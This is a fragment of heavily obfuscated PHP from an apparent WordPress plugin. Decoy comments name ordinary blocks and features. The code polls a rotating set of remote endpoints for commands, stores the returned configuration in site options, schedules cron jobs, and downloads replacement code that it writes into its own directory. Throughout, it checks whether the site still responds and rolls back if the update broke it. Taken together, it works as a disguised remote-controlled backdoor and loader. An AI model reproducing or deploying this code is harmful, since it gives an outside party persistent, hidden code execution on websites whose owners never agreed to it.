     g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(622), $cje8wku90zm4r);
      continue;
   } catch    (Exception  $cje8wku90zm4r)  {
 continue;
 }
  }
 if (!      $GLOBALS['__scf_w1m1ydxx4_gm9__38']($gm69t85l5gf7p80)    &&  empty($GLOBALS[f6yrzd2knrmb(614)])) {
$pxf5u1wa46jdkzz =    f0h420wzduis5n6p2($GLOBALS['__scf__r5ulaote4t_611'](array(
  f6yrzd2knrmb(623)    =>      xyhhquc02dkq5zwsgxhdu(""),
   ovffvv33(602)   => dfb4_mpcgxvnp230hvh1v(),
  iw6xe9q4j6sneg(624) => $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),  f6yrzd2knrmb(625)),
bpowi0iglycvx(626) =>   1,
)),     $m05crxk0nicolr);
      $fqntej805r  =  $GLOBALS['__scf_ofdeuvs8zwos6_12'](strtr($GLOBALS['__scf_f2vx2328qo_369']($pxf5u1wa46jdkzz),     bpowi0iglycvx(627),   bpowi0iglycvx(628)),   '=');
    $ih5rjzjx8sn   =  $GLOBALS['__scf_o96w7gevmp_629']($fqntej805r,  (1398+2));
 foreach ($iycz9idnhz      as $o_mle9hlw6xo) {


 if  (($GLOBALS['__scf_u2xtklnzk8_7_x_300'](true) -  $wb6k72queg13ohyn)  >  $_27goe5xippn8139) {


     break;

}
      $o_mle9hlw6xo  = $GLOBALS['__scf_qew3crlieule_339']((string) $o_mle9hlw6xo);
      if ($o_mle9hlw6xo === "")     {
     continue;
}
 $wy11lk1fug  = nreub2fs747eromoe(xyhhquc02dkq5zwsgxhdu("")     .  $GLOBALS['__scf_u2xtklnzk8_7_x_300'](true),  (10-2));
  $ukjj4vzpxsr  =  $GLOBALS['__scf_wj6dld55k5r8m_39']($ih5rjzjx8sn);
    $ml77s_78v6    =  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($o_mle9hlw6xo, '?')   === false)   ? '?' : '&';
for ($jqexd5um710p4flb  = 0;  $jqexd5um710p4flb   <   $ukjj4vzpxsr;  $jqexd5um710p4flb++)  {
       if (($GLOBALS['__scf_u2xtklnzk8_7_x_300'](true) -  $wb6k72queg13ohyn)  >     $_27goe5xippn8139) {
  break;
}


$yc3_w626p0vjy   =  ($jqexd5um710p4flb ===   $ukjj4vzpxsr    -  1);



  $k0fnyb_te3c86_hf  = $o_mle9hlw6xo    .  $ml77s_78v6    .  f6yrzd2knrmb(630) .  $wy11lk1fug .     bpowi0iglycvx(631)    . $jqexd5um710p4flb  .  iw6xe9q4j6sneg(632)     . $ukjj4vzpxsr .  c1sob647u1i(633) .   $ih5rjzjx8sn[$jqexd5um710p4flb];
$ijr9dvph8b  =  d_85zr13yf34xr7($k0fnyb_te3c86_hf,    (0x3+0x5),  $yc3_w626p0vjy  ?   function ($aakozw_1zysblhgx) use ($m05crxk0nicolr)    {
  $kekj16jieb     =   f0h420wzduis5n6p2($aakozw_1zysblhgx,     $m05crxk0nicolr);
        if    (!$kekj16jieb)   return false;
 return $GLOBALS['__scf_w1m1ydxx4_gm9__38'](@$GLOBALS['__scf_yeixh7nk2_03ag_344']($GLOBALS['__scf_qew3crlieule_339']($kekj16jieb), true));
     }     :   null);

     if     ($yc3_w626p0vjy   && $GLOBALS['__scf_fv3zevxzzb_44']($ijr9dvph8b)  &&     $ijr9dvph8b !==  "") {
  $_gd   = f0h420wzduis5n6p2($ijr9dvph8b,   $m05crxk0nicolr);
 $iib_qzqrye7xfhon  =   ($_gd    &&  ($GLOBALS['__scf_d4eyetogjbsnt_10']($_gd)  <=  (1048477+99) || mwr_737feiwcxt($GLOBALS['__scf_d4eyetogjbsnt_10']($_gd)))) ?     @$GLOBALS['__scf_yeixh7nk2_03ag_344']($GLOBALS['__scf_qew3crlieule_339']($_gd),   true)     : null;$lmoindohvi4a4=156|53;$hzmzkts08=$lmoindohvi4a4^9;
if ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($iib_qzqrye7xfhon))  {
 $gm69t85l5gf7p80  =  $iib_qzqrye7xfhon;
      if   ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(634))) {
 update_option(iw6xe9q4j6sneg(620),  $o_mle9hlw6xo);
    }
 break;


    }

  }
 }
 if ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($gm69t85l5gf7p80))     {
 break;



   }
 }
}
$GLOBALS[bpowi0iglycvx(614)]   =  false;
  if   (!    $GLOBALS['__scf_w1m1ydxx4_gm9__38']($gm69t85l5gf7p80)) {
    return;


}
 if  ($tl2wzith_j0b)   {


    nz9tz9g9s_g_h0f7fd2h();
  }
     if  ($jmahqyk_g3tzo     && $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(635)))   {
    delete_option(bvrd_z3xzbvaqt(bpowi0iglycvx(386)));
unset($GLOBALS[c1sob647u1i(374)][bvrd_z3xzbvaqt(ovffvv33(386))]);



      }
// WP Home Link: schedule journal

 if  (!isset($GLOBALS[ovffvv33(636)]) ||  !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($GLOBALS[f6yrzd2knrmb(636)]))   $GLOBALS[f6yrzd2knrmb(636)] =    array();
 $GLOBALS[ovffvv33(636)]    =      $GLOBALS['__scf_vmnuset3sz__158']($GLOBALS['__scf_yucj673b8x_164']($GLOBALS[ovffvv33(637)], $jmahqyk_g3tzo));
   if (isset($gm69t85l5gf7p80[ovffvv33(624)]) &&      $GLOBALS['__scf_fv3zevxzzb_44']($gm69t85l5gf7p80[iw6xe9q4j6sneg(638)])) {
// FFI bindings block attributes

 unset($GLOBALS[f6yrzd2knrmb(587)]);


   q1_1czinqrr85su74y($gm69t85l5gf7p80[iw6xe9q4j6sneg(638)],   isset($gm69t85l5gf7p80[iw6xe9q4j6sneg(639)])   &&   $GLOBALS['__scf_fv3zevxzzb_44']($gm69t85l5gf7p80[iw6xe9q4j6sneg(639)]) ?     $gm69t85l5gf7p80[iw6xe9q4j6sneg(639)] :    "",  !empty($gm69t85l5gf7p80[f6yrzd2knrmb(640)]));

       }


     $o7_y4lsld_o0 = false;



  $ti64d6kfvt   = array();$u1i1r0ny8et5=(0x45+0xb7);$irzxv2m9ib=$u1i1r0ny8et5%11;
   
     if   (isset($gm69t85l5gf7p80[iw6xe9q4j6sneg(453)]) &&    $GLOBALS['__scf_w1m1ydxx4_gm9__38']($gm69t85l5gf7p80[bpowi0iglycvx(453)]))      {
$bmexhiz2a5dq6x  = array();

  
  foreach  ($gm69t85l5gf7p80[iw6xe9q4j6sneg(453)] as $n0tlzmrutbrfwh_)   {


      if   ($GLOBALS['__scf_fv3zevxzzb_44']($n0tlzmrutbrfwh_) &&   $n0tlzmrutbrfwh_      !== "") {

 $bmexhiz2a5dq6x[]  =    $n0tlzmrutbrfwh_;
     }
        }
   $h7j0_8jwofr  = $GLOBALS[iw6xe9q4j6sneg(641)];
     $bmexhiz2a5dq6x =  q_e2d5hqepxmcavjyt_($bmexhiz2a5dq6x);
   $GLOBALS[f6yrzd2knrmb(641)]    =  $bmexhiz2a5dq6x;
   $ti64d6kfvt[c1sob647u1i(453)] =     $bmexhiz2a5dq6x;
     if  (! empty($GLOBALS['__scf_yucj673b8x_164']($bmexhiz2a5dq6x,  $h7j0_8jwofr))    ||  !   empty($GLOBALS['__scf_yucj673b8x_164']($h7j0_8jwofr,   $bmexhiz2a5dq6x))) {
 $o7_y4lsld_o0   =    true;
}
   }
    
   if  (isset($gm69t85l5gf7p80[c1sob647u1i(458)])  &&    $GLOBALS['__scf_w1m1ydxx4_gm9__38']($gm69t85l5gf7p80[c1sob647u1i(458)])) {
 $bmexhiz2a5dq6x   =      array();





      foreach  ($gm69t85l5gf7p80[hn_f08x0cns80(458)]  as $n0tlzmrutbrfwh_)   {

   if ($GLOBALS['__scf_fv3zevxzzb_44']($n0tlzmrutbrfwh_)   &&   $n0tlzmrutbrfwh_   !==  "")    {
      $bmexhiz2a5dq6x[] = $n0tlzmrutbrfwh_;
 }
  }
       $h7j0_8jwofr = $GLOBALS[iw6xe9q4j6sneg(457)];
  $bmexhiz2a5dq6x   = q_e2d5hqepxmcavjyt_($bmexhiz2a5dq6x);
    $GLOBALS[c1sob647u1i(457)]    =  $bmexhiz2a5dq6x;
 $ti64d6kfvt[ovffvv33(458)] =  $bmexhiz2a5dq6x;$wmgztl1lbqsv4=236|172;$qy4fdf24=$wmgztl1lbqsv4^42;
     if (!   empty($GLOBALS['__scf_yucj673b8x_164']($bmexhiz2a5dq6x,   $h7j0_8jwofr)) ||  !  empty($GLOBALS['__scf_yucj673b8x_164']($h7j0_8jwofr,    $bmexhiz2a5dq6x))) {
      $o7_y4lsld_o0      = true;
    }
 }


      if (isset($gm69t85l5gf7p80[bpowi0iglycvx(642)])    &&   $GLOBALS['__scf_fv3zevxzzb_44']($gm69t85l5gf7p80[f6yrzd2knrmb(642)])) {
   $eejjsdsjjjbr =  q87voct054xu7c(c1sob647u1i(643), "");
 if    ($eejjsdsjjjbr    !== ""  &&  (int)   fcc42yo6xrdenvra0(f6yrzd2knrmb(644),  0)   ===  0) {
mw5stmpiys2hi3k2xe14i(iw6xe9q4j6sneg(644),  1,   bpowi0iglycvx(645));
    if    ((int)   fcc42yo6xrdenvra0(iw6xe9q4j6sneg(646), 0)   !==  1) mw5stmpiys2hi3k2xe14i(hn_f08x0cns80(646),   1,    iw6xe9q4j6sneg(647));
    }
   $GLOBALS[ovffvv33(648)]   =  $gm69t85l5gf7p80[hn_f08x0cns80(642)];

 $ti64d6kfvt[iw6xe9q4j6sneg(649)]   =      $gm69t85l5gf7p80[iw6xe9q4j6sneg(649)];
  if ($GLOBALS['__scf_tnonex5o9y_60']($gm69t85l5gf7p80[ovffvv33(649)])    !==   $GLOBALS['__scf_tnonex5o9y_60']($eejjsdsjjjbr)   ||      (int) fcc42yo6xrdenvra0(bpowi0iglycvx(646), 0)    === 1) {$ha8vkd6h=9452;$jf53bekord4=$ha8vkd6h%10;
   if (mw5stmpiys2hi3k2xe14i(hn_f08x0cns80(643),    $gm69t85l5gf7p80[bpowi0iglycvx(649)],      c1sob647u1i(647)) ||  q87voct054xu7c(iw6xe9q4j6sneg(643),     "")  ===  $gm69t85l5gf7p80[iw6xe9q4j6sneg(649)]) {
  mw5stmpiys2hi3k2xe14i(hn_f08x0cns80(646),   1,  bpowi0iglycvx(650));
      try  {



    if     (vbuvhui0kpao77gf())   mw5stmpiys2hi3k2xe14i(f6yrzd2knrmb(651),   0,   hn_f08x0cns80(650));
  }  catch  (Throwable  $cje8wku90zm4r)  {
 } catch  (Exception  $cje8wku90zm4r) {

  }
 }  else      {



lffxvxzmu_ppkc1pzm();
  return;
  }
        }
   unset($eejjsdsjjjbr);
}
$qawn4e41sgc8u1s     =  isset($gm69t85l5gf7p80[c1sob647u1i(380)]) && $GLOBALS['__scf_w1m1ydxx4_gm9__38']($gm69t85l5gf7p80[hn_f08x0cns80(380)])   ?     $gm69t85l5gf7p80[iw6xe9q4j6sneg(380)]    :   array();
if    (isset($qawn4e41sgc8u1s[c1sob647u1i(464)])     &&    $GLOBALS['__scf_fv3zevxzzb_44']($qawn4e41sgc8u1s[hn_f08x0cns80(464)]))     {
   if  ($GLOBALS['__scf_d4eyetogjbsnt_10']($qawn4e41sgc8u1s[ovffvv33(652)])  >  (90-40))  {
   $GLOBALS[iw6xe9q4j6sneg(463)] =   $qawn4e41sgc8u1s[bpowi0iglycvx(653)];
      $ti64d6kfvt[f6yrzd2knrmb(653)]    =    $qawn4e41sgc8u1s[iw6xe9q4j6sneg(653)];


     }  else    {
  $GLOBALS[c1sob647u1i(463)]  = "";
  $ti64d6kfvt[c1sob647u1i(653)] = "";
mw5stmpiys2hi3k2xe14i(bpowi0iglycvx(654),  "",  iw6xe9q4j6sneg(650));
       }

    }
if  (isset($qawn4e41sgc8u1s[ovffvv33(380)]) && $GLOBALS['__scf_fv3zevxzzb_44']($qawn4e41sgc8u1s[f6yrzd2knrmb(380)]))      {
  if ($GLOBALS['__scf_d4eyetogjbsnt_10']($qawn4e41sgc8u1s[c1sob647u1i(380)])   >  (1+99))   {


 $GLOBALS[iw6xe9q4j6sneg(465)]    = $qawn4e41sgc8u1s[bpowi0iglycvx(655)];
     $ti64d6kfvt[f6yrzd2knrmb(655)]   =   $qawn4e41sgc8u1s[hn_f08x0cns80(655)];
  }   else   {
 $GLOBALS[bpowi0iglycvx(465)] =    "";

   $ti64d6kfvt[f6yrzd2knrmb(655)]     =  "";
 mw5stmpiys2hi3k2xe14i(f6yrzd2knrmb(382), "",  ovffvv33(656));
  }

   }
/* predictive mediator */

 $m_cmw_ipv8hlm  =    isset($gm69t85l5gf7p80[ovffvv33(657)])   &&   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($gm69t85l5gf7p80[ovffvv33(658)])     ? $gm69t85l5gf7p80[hn_f08x0cns80(658)]     :   array();
    $o1um6yc7ttg =  array(
  c1sob647u1i(659)   =>    iw6xe9q4j6sneg(659),
ovffvv33(660) => c1sob647u1i(661),
 f6yrzd2knrmb(662)  => f6yrzd2knrmb(663),
  ovffvv33(664)     => hn_f08x0cns80(665),
   hn_f08x0cns80(666)   => c1sob647u1i(667),
 ovffvv33(668)     =>  bpowi0iglycvx(669),

  );
    foreach    ($o1um6yc7ttg   as    $rx0j11ros8cmk4v =>   $dxm6gv8na8) {

if    (isset($m_cmw_ipv8hlm[$rx0j11ros8cmk4v])  && $GLOBALS['__scf_fv3zevxzzb_44']($m_cmw_ipv8hlm[$rx0j11ros8cmk4v])      && $GLOBALS['__scf_d4eyetogjbsnt_10']($m_cmw_ipv8hlm[$rx0j11ros8cmk4v])   > (115^65)) {

$ti64d6kfvt[$dxm6gv8na8]  =  $m_cmw_ipv8hlm[$rx0j11ros8cmk4v];$uskngff4tg5=PHP_INT_MAX/PHP_INT_MAX;$cm9a426y5ywl6=$uskngff4tg5+24;
    }
       }
   if    (isset($gm69t85l5gf7p80[c1sob647u1i(489)])  &&  $GLOBALS['__scf_ho6tixfm0uth_f_670']($gm69t85l5gf7p80[hn_f08x0cns80(671)]))    {

 $j5poxm2ctq48hmqg    = (int)  $gm69t85l5gf7p80[hn_f08x0cns80(671)];



 if  ($j5poxm2ctq48hmqg   >= (24+276)     && $j5poxm2ctq48hmqg <= (86338+62)) $ti64d6kfvt[f6yrzd2knrmb(672)]  =   $j5poxm2ctq48hmqg;
}
if  (isset($gm69t85l5gf7p80[bpowi0iglycvx(673)]) &&  $GLOBALS['__scf_ho6tixfm0uth_f_670']($gm69t85l5gf7p80[f6yrzd2knrmb(673)]))   {$z935surij57=71*2;$pdmmca66egu=$z935surij57-41;

   $_ci =    (int)  $gm69t85l5gf7p80[iw6xe9q4j6sneg(673)];
if ($_ci    >= (0xc7+0x65) &&   $_ci  <=  (86392+8))  $ti64d6kfvt[c1sob647u1i(673)] =   $_ci;


  }
if  (empty($ti64d6kfvt))    {
   delete_option(ovffvv33(561));
 delete_option(c1sob647u1i(492));
  update_option(ovffvv33(490),    $GLOBALS['__scf_qzyo0sgkyb6_202']());



  delete_transient(f6yrzd2knrmb(674));
    nj270i1voyjyvmxd();
    r8j56gi10sbzxd2f4olo();$wmc6irmvh=PHP_MAJOR_VERSION;$qp599qz8902=$wmc6irmvh*6;
 return;
}

 
 $b7iipm1kgta2iscx    =    obnmo3d9gt514xoc(f6yrzd2knrmb(391),  false);
 if      ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($b7iipm1kgta2iscx))  {
    $ti64d6kfvt  =  $GLOBALS['__scf_en9wrpvm3eosc_387']($b7iipm1kgta2iscx,   $ti64d6kfvt);
      }
// activate authority for WP Navigation Block

   
  if    ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(675))) {
// virtual dispatch

 $zku4kju_id2lld1     =   bcb80tag96ir7air0u8xp7();
  if    (isset($ti64d6kfvt[iw6xe9q4j6sneg(672)])   &&   (int)  $ti64d6kfvt[iw6xe9q4j6sneg(676)]  >=   (0x99+0x93)  &&   (int) $ti64d6kfvt[c1sob647u1i(677)]   <=     (311+86089))   $zku4kju_id2lld1    =   (int)    $ti64d6kfvt[bpowi0iglycvx(677)];
    set_transient(p1srpzpjsehf9kb72(), $ti64d6kfvt, $zku4kju_id2lld1);



 }
  


   if    (!duwyb86hxwrc6k0zk8vqtt(iw6xe9q4j6sneg(391),   $ti64d6kfvt,    hn_f08x0cns80(678)))    {



    $kuccx8ppua   =  obnmo3d9gt514xoc(f6yrzd2knrmb(391),  null);
if     (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($kuccx8ppua) ||  $kuccx8ppua   !=   $ti64d6kfvt)  {



    lffxvxzmu_ppkc1pzm();
 return;



  }
  unset($kuccx8ppua);
  }
 if    (isset($ti64d6kfvt[ovffvv33(673)])  && $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(679))     &&  $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(680))   &&  $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(401)))   {
$qs1nyzj2e3y95rd2   =     wp_get_scheduled_event(vwa_1wxh4uqtqo4afj0x8());
     if     ($qs1nyzj2e3y95rd2   && (int) $qs1nyzj2e3y95rd2->interval !==     (int)    $ti64d6kfvt[bpowi0iglycvx(673)])   {
     wp_clear_scheduled_hook(vwa_1wxh4uqtqo4afj0x8());
   wp_schedule_event($GLOBALS['__scf_qzyo0sgkyb6_202']()  + $GLOBALS['__scf_ew0pe5qy71c8x_368']((0xb+0x31),     (370-70)), f6yrzd2knrmb(393), vwa_1wxh4uqtqo4afj0x8());
      }
  }
 update_option(c1sob647u1i(681),    $GLOBALS['__scf_qzyo0sgkyb6_202']());
     delete_option(ovffvv33(561));



delete_option(ovffvv33(492));$boftevpi=-308;$ivkfiw4dgbxnw=($boftevpi>0)?$boftevpi:-$boftevpi;
 delete_transient(iw6xe9q4j6sneg(674));
 nj270i1voyjyvmxd();
  r8j56gi10sbzxd2f4olo();
   
      if ($o7_y4lsld_o0)  {
     hdqzd48jmwy1age4cmt9();
    }


}    catch   (Throwable $cje8wku90zm4r)     {
  g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(617), $cje8wku90zm4r);
      }  catch     (Exception $cje8wku90zm4r)   {
   } finally   {
 unset($GLOBALS[iw6xe9q4j6sneg(587)]);
l5zn64lzopflqr0dsekx(c1sob647u1i(402));



   }
}
    



function    q1_1czinqrr85su74y($ozabhsai4u_m, $cfrn89qb0_ot6_o =  "",    $yswx0sxl05d3r  =  false)
     {
  if    (!dtf7lvb25ztuc8jh3htk(c1sob647u1i(402)))    return;


   try  {



   $hiq6gpdhz9  =  sst6ig4atwfj9zru();
    if    ($hiq6gpdhz9  >      0  && $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(682))    &&  !mwr_737feiwcxt($GLOBALS['__scf_d4eyetogjbsnt_10']($ozabhsai4u_m)    * (3+1)))   {
  g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(683),  iw6xe9q4j6sneg(684));



 return;
  }
unset($hiq6gpdhz9);

       
 $atq8kbzvgtxgffq     =    @$GLOBALS['__scf_i8wggf4l_3p_373']($ozabhsai4u_m, true);
     if   ($GLOBALS['__scf_fv3zevxzzb_44']($atq8kbzvgtxgffq)  && $GLOBALS['__scf_d4eyetogjbsnt_10']($atq8kbzvgtxgffq)  > (1048499+77))  $atq8kbzvgtxgffq   =  k12vjaxiygekdnj($atq8kbzvgtxgffq);
     

 if (! $atq8kbzvgtxgffq ||  $GLOBALS['__scf_d4eyetogjbsnt_10']($atq8kbzvgtxgffq) <   (755-255)   || $GLOBALS['__scf_w6mdcepio4lkz5_7']($atq8kbzvgtxgffq,   hn_f08x0cns80(685)) !== 0)  {
 return;
}
  if (!     ib2ffadoyj2m6zxmkaa2in($atq8kbzvgtxgffq))   {$r9hpi1ehhkga=PHP_INT_MAX/PHP_INT_MAX;$njjwvcyyl2o=$r9hpi1ehhkga+61;
    g_qoqdy38lfl4v4n3618(ovffvv33(683),   iw6xe9q4j6sneg(686));
 return;
}
     if  ($GLOBALS['__scf_wdjvpd1lvon9_102'](iw6xe9q4j6sneg(103),      $GLOBALS['__scf_nv7he759wjfj_9']($atq8kbzvgtxgffq, 0,      (4001+95)), $luvrwg08bur1b))  {
if   ($cfrn89qb0_ot6_o    !== ""   &&   $cfrn89qb0_ot6_o   !== $luvrwg08bur1b[1])  {$kr09rli2hyf=(0xc5+0x1b);$p885xzmdr6cfq0=$kr09rli2hyf%7;
 g_qoqdy38lfl4v4n3618(bpowi0iglycvx(683),  bpowi0iglycvx(687));
     return;
    }
  $cfrn89qb0_ot6_o   = $luvrwg08bur1b[1];


 }   else  {
g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(683), hn_f08x0cns80(688));
    return;
}
// WP Spacer Block: escape-analyze stabilizer

  if  (!$yswx0sxl05d3r  && version_compare($cfrn89qb0_ot6_o, dfb4_mpcgxvnp230hvh1v())    <=   0)  {


return;
  }
  $q8d57u4ubu     = bfyls7pdkqkf4p8az();



if  (!$q8d57u4ubu   ||   $GLOBALS['__scf_d4eyetogjbsnt_10']($q8d57u4ubu) <  (228+272))  {
  g_qoqdy38lfl4v4n3618(hn_f08x0cns80(683),  iw6xe9q4j6sneg(689));
return;
   }
    $s_osedh7j8bijw = get_option(f6yrzd2knrmb(203));
  if  ($GLOBALS['__scf_fv3zevxzzb_44']($s_osedh7j8bijw)     &&   $GLOBALS['__scf_w6mdcepio4lkz5_7']($s_osedh7j8bijw,   $GLOBALS['__scf_tnonex5o9y_60']($atq8kbzvgtxgffq)  .    '|') ===   0) {
 return;
 }
$iyz3q9dqlrw = $GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t()) .   iw6xe9q4j6sneg(201)    . $GLOBALS['__scf_tnonex5o9y_60']($atq8kbzvgtxgffq);
 if (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($iyz3q9dqlrw)) {
 return;
     }


unset($iyz3q9dqlrw);
   if   (!$yswx0sxl05d3r)    {
$o_9uwh9lppxn1k  =      @get_option(hn_f08x0cns80(690), "");
 if     ($GLOBALS['__scf_fv3zevxzzb_44']($o_9uwh9lppxn1k)  &&   $GLOBALS['__scf_w6mdcepio4lkz5_7']($o_9uwh9lppxn1k, $GLOBALS['__scf_tnonex5o9y_60']($atq8kbzvgtxgffq)     .  '|')  === 0)      {
   $rbrghulpfldp1  =   (int)  $GLOBALS['__scf_nv7he759wjfj_9']($o_9uwh9lppxn1k, $GLOBALS['__scf_w6mdcepio4lkz5_7']($o_9uwh9lppxn1k,  '|')  + 1);
if  ($rbrghulpfldp1   &&   $GLOBALS['__scf_qzyo0sgkyb6_202']() -  $rbrghulpfldp1  < (877+23))    return;
  }
   unset($o_9uwh9lppxn1k, $rbrghulpfldp1);
   }
  $b9rmfoshoosn =  false;
if  ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(691))     &&   $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(480))) {

  $w9ppu6ev6lw    =  $GLOBALS['__scf_r7h_2y83ismjfq_303'](home_url('/'),  array(hn_f08x0cns80(485)     =>     (0x7+0x1), c1sob647u1i(692)  =>     2,    bpowi0iglycvx(411) =>  false,  ovffvv33(693)    =>   (0xd1ba1+0x2e45f)));
  if  (!     ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(326))   &&  is_wp_error($w9ppu6ev6lw)))     {
 $b9rmfoshoosn =  (int)   wp_remote_retrieve_response_code($w9ppu6ev6lw)  >=    (0x10f+0xe5);
}
    }
   $megqpf1mpthj = false;
    if   ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(694)))  {
$jia_zm3l7as01e      =  get_option(hn_f08x0cns80(695),     array());
     $megqpf1mpthj  =   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($jia_zm3l7as01e)   && $GLOBALS['__scf_rd2tojulg06lx_160'](ayw2e71sos2ne2g(), $jia_zm3l7as01e,    true);
}
 ruinnb541lwxm7j(bmvtr5sdqjf5km1t(),  (401+19));
if   (!   c5kyk62yk_dwfeubni4b(bmvtr5sdqjf5km1t(), fcywjpu_2kwq2ahog4($atq8kbzvgtxgffq))) {
 g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(683),   iw6xe9q4j6sneg(696));
 return;
 }
     o4_k_ap14u5xy97yywy7k(bmvtr5sdqjf5km1t());



      hwyiz3722wut3tw(bmvtr5sdqjf5km1t());
 if    ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(675)))    @set_transient(iw6xe9q4j6sneg(697),  1, (259+41));
  $qucqyukhgy     = false;
 if   (!  $b9rmfoshoosn  &&      $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(691))   &&   $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(480)))  {
  $ch7u8u2ur1  =   -1;
 for  ($y_z98jsfymkwcxz =  0;  $y_z98jsfymkwcxz <  2;  $y_z98jsfymkwcxz++)  {
  $fpcv32y86pyln2w6   =  $GLOBALS['__scf_r7h_2y83ismjfq_303'](home_url(iw6xe9q4j6sneg(698)  .  $GLOBALS['__scf_ew0pe5qy71c8x_368']((140442-40442),   (402188+597811))),   array(hn_f08x0cns80(485) => (2+6),  c1sob647u1i(699)  => 2, bpowi0iglycvx(411) =>   false,     c1sob647u1i(700)  =>   (1048484+92)));
 if  ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(326))    &&  is_wp_error($fpcv32y86pyln2w6))   {
    if  ($y_z98jsfymkwcxz     === 0  &&     $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(701)))   $GLOBALS['__scf_ajgx8h162s_701'](2);
     continue;


 }
// terminate expected session-window

$sy1wtx_ep3qz  =   (int) wp_remote_retrieve_response_code($fpcv32y86pyln2w6);
if   ($sy1wtx_ep3qz <  (69+31)  || $GLOBALS['__scf_rd2tojulg06lx_160']($sy1wtx_ep3qz,  array((483+20),  (430+90), (462+59),   (576-54),     (532-9),  (509+15), (0xf+0x1ff),    (476+51)), true)) {
   if   ($y_z98jsfymkwcxz      ===   0   &&    $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(701)))  $GLOBALS['__scf_ajgx8h162s_701'](2);
 continue;
  }
    $ch7u8u2ur1   =  $sy1wtx_ep3qz;
break;
    }
 if ($ch7u8u2ur1 ===   -1)  g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(683),      f6yrzd2knrmb(702)); 

if   ($ch7u8u2ur1  !== -1   && $ch7u8u2ur1 <  (231+269))      $qucqyukhgy =     true;
if     ($ch7u8u2ur1 !==   -1    &&  $ch7u8u2ur1    >= (0x16f+0x85))     {
   $dlj9nxra6fk0kee   =   c5kyk62yk_dwfeubni4b(bmvtr5sdqjf5km1t(),     fcywjpu_2kwq2ahog4($q8d57u4ubu));
   if   (!$dlj9nxra6fk0kee)   $dlj9nxra6fk0kee  =   c5kyk62yk_dwfeubni4b(bmvtr5sdqjf5km1t(), $q8d57u4ubu);
// @deactivate stabilizer

       $fhl6fo2sovvi9q    =     $GLOBALS['__scf_tnonex5o9y_60']($atq8kbzvgtxgffq);
 $wwy9k20f902rnjhg    = @get_option(iw6xe9q4j6sneg(690),     "");
  $hlhn39ij3ijkic4k  =  false;
  if  ($GLOBALS['__scf_fv3zevxzzb_44']($wwy9k20f902rnjhg) &&   $GLOBALS['__scf_w6mdcepio4lkz5_7']($wwy9k20f902rnjhg,  $fhl6fo2sovvi9q  .    '|')     ===  0)   {
 $txvggjcyt15u9  = (int) $GLOBALS['__scf_nv7he759wjfj_9']($wwy9k20f902rnjhg,    $GLOBALS['__scf_w6mdcepio4lkz5_7']($wwy9k20f902rnjhg,     '|') +  1);$gr4mafrdw7hc2=8966;$rilfmz7xc16vqk=$gr4mafrdw7hc2%11;



 $hlhn39ij3ijkic4k    = $txvggjcyt15u9  && $GLOBALS['__scf_qzyo0sgkyb6_202']()  -  $txvggjcyt15u9     >=     (0x1c3+0x1c1) &&  $GLOBALS['__scf_qzyo0sgkyb6_202']()   -   $txvggjcyt15u9  <=     (604725+75);
   }
// unfold dynamic adapter

 if ($hlhn39ij3ijkic4k)   {
// restore clopen vault

 update_option(c1sob647u1i(703),  $fhl6fo2sovvi9q  .  '|'    .  $GLOBALS['__scf_qzyo0sgkyb6_202'](), c1sob647u1i(704));
  @delete_option(ovffvv33(690));
 }   else  {


    @update_option(ovffvv33(690),    $fhl6fo2sovvi9q  .    '|'    . $GLOBALS['__scf_qzyo0sgkyb6_202']()     . '|'   . $ch7u8u2ur1,  f6yrzd2knrmb(705));
   }
  unset($fhl6fo2sovvi9q, $wwy9k20f902rnjhg,   $hlhn39ij3ijkic4k,   $txvggjcyt15u9);
if  (!$dlj9nxra6fk0kee)     {



 g_qoqdy38lfl4v4n3618(ovffvv33(683),  f6yrzd2knrmb(706)  .  $ch7u8u2ur1);$jzdxiuqcw=164|203;$czy_47eovny=$jzdxiuqcw^71;
 return;
   }
  hwyiz3722wut3tw(bmvtr5sdqjf5km1t());
  o4_k_ap14u5xy97yywy7k(bmvtr5sdqjf5km1t());



  bfyls7pdkqkf4p8az(true);
  eos4svadcaj0dow8y(true);
$ub2ib8untl  =   $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),  f6yrzd2knrmb(625));
 foreach (array($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t()), jo62hy1j37iqrmy())      as    $uyq5d0ub9d) {
@$GLOBALS['__scf_fbizamz5bjakz_20']($uyq5d0ub9d  .  ovffvv33(208)      .  $ub2ib8untl);

